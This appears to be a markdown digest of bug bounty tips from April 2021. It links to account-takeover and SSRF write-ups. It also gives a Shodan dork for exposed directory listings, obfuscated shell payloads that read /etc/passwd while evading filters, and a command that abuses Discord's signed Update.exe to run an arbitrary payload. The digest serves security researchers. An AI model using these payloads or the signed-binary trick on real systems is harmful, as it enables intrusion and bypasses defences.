# Bug Bounty Tips - April 2021

# 📅 01-Apr-2021
## Exploiting Account TakeOver => CSRF + CORS
- https://nirajmodi51.medium.com/missing-cors-leads-to-complete-account-takeover-1ed4b53bf9f2

## MindAPI 
Organize your API security assessment by using MindAPI. It's free and open for community collaboration.
- https://github.com/dsopas/MindAPI

## Bug Bytes 116
- https://blog.intigriti.com/2021/03/31/bug-bytes-116-new-oauth-attacks-hacking-shopify-with-a-single-dot-netmask-ssrf/

# 📅 01-Apr-2021
## Facebook Account Takeover writeups
- https://ysamm.com/?p=654
- https://ysamm.com/?p=646

## Dangerous Functions | Binary Exploitation 0x01
- https://youtu.be/EJtUW2AklVs

# 📅 05-Apr-2021
## Shodan Dorks
Everyone knows how to find Directory Listing Using Google Dorks Right?
Dork - intitle:"Index of /"

We can do the same with Shodan to find even more Directory Listings!

Dork- `http://ssl.cert.subject.CN:"*target.*" 200 http.title:"Index of /"`

## Obfuscation Random characters

### Payloads

```sh
$aaaaaaa/bin$bbbbbb/cat$ccccccc $dddddddd/etc$eeeeeee/passwd$ggggggg

$sdijchkd/???$sdjhskdjh/??t$skdjfnskdj $sdofhsdhjs/???$osdihdhsdj/??ss??$skdjhsiudf
```
### Proof of Concept
![img](https://pbs.twimg.com/media/EyMKkZWVEAAInk9?format=png&name=small)
![img](https://pbs.twimg.com/media/EyMKkZXUYAIaclN?format=png&name=large)
***Source: https://twitter.com/sec715/status/1378957974790492160?s=20***

# 📅 07-Apr-2021
## RCE on Windows Application

Copy your payload into `%userprofile%\AppData\Local\Discord\Current\`

Then

```cmd
%userprofile%\AppData\Local\Discord\Update.exe --processStart payload.exe --process-start-args "whatever args"
```

Trusted signed binary will run the payload for you Smiling face with smiling eyes

***Source: https://twitter.com/smelly__vx/status/1379519938197655566?s=20***
